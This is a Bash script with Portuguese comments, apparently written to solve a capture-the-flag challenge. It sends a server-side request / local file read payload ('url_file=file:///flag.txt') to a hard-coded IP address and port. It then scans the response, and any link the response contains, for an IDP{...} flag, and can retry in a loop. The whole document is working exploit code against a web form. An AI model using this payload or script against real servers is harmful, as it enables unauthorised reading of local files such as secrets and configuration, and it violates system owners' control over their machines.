#!/usr/bin/env bash
# try_res26_only.sh
# Envia somente: POST url_file=file:///flag.txt
# - Salva resposta principal
# - Procura por IDP{...}
# - Se encontrar link (http://... ou https://...), faz GET e procura IDP nele também
# - Loop opcional: re-tentar até achar o IDP
#
# Uso:
#  ./try_res26_only.sh        # 1 tentativa
#  ./try_res26_only.sh loop   # tenta indefinidamente até achar (sleep definido abaixo)
#
# Ajustes:
TARGET="http://20.102.93.39:33152/"   # endpoint do form (ajuste se necessário)
OUTDIR="res26_only_results"
FIELD="url_file"
PAYLOAD="file:///flag.txt"
SLEEP=10          # segundos entre tentativas no modo loop
MAXTIME=15        # timeout curl em segundos

mkdir -p "$OUTDIR"

do_one() {
  ts=$(date +"%Y%m%d_%H%M%S")
  out="$OUTDIR/res26_${ts}.html"
  echo "[$(date +'%T')] POST ${FIELD}=${PAYLOAD} -> salvando em $out"
  # Faz o POST
  curl -s -m "$MAXTIME" -X POST "$TARGET" -d "${FIELD}=${PAYLOAD}" -o "$out"
  # tenta extrair IDP{...} direto na resposta
  flag=$(grep -oP "IDP\{[^}]*\}" "$out" 2>/dev/null | head -n1 || true)
  if [ -n "$flag" ]; then
    echo ">>> FLAG encontrada na resposta principal: $flag"
    echo "$flag" > "$OUTDIR/last_flag.txt"
    return 0
  fi

  # Se não encontrou, procura por links (http/https):
  # tenta pegar o primeiro link completo http(s)://... (até espaço ou ")
  link=$(grep -oP "https?://[0-9A-Za-z./:?=&_%#-]*" "$out" | head -n1 || true)
  if [ -n "$link" ]; then
    echo "Resposta continha link -> $link"
    # baixa o link temporário
    out2="$OUTDIR/res26_link_$(date +'%Y%m%d_%H%M%S').html"
    curl -s -m "$MAXTIME" "$link" -o "$out2"
    # procura flag no link
    flag2=$(grep -oP "IDP\{[^}]*\}" "$out2" 2>/dev/null | head -n1 || true)
    if [ -n "$flag2" ]; then
      echo ">>> FLAG encontrada no link temporário: $flag2"
      echo "$flag2" > "$OUTDIR/last_flag.txt"
      return 0
    else
      echo "Nenhuma IDP{...} no link ($out2)."
    fi
  else
    echo "Nenhum link detectado na resposta."
  fi

  # nada encontrado
  return 1
}

if [ "$1" = "loop" ]; then
  echo "Modo loop: tentando repetidamente a cada ${SLEEP}s até achar a flag (CTRL+C para parar)..."
  while true; do
    if do_one; then
      echo "Flag capturada — fim do loop."
      exit 0
    else
      echo "Sem flag. Aguarda ${SLEEP}s..."
      sleep "$SLEEP"
    fi
  done
else
  if do_one; then
    echo "FLAG encontrada. Veja $OUTDIR/last_flag.txt"
    exit 0
  else
    echo "Nenhuma flag encontrada nessa tentativa. Verifique os arquivos em $OUTDIR para detalhes."
    exit 2
  fi
fi
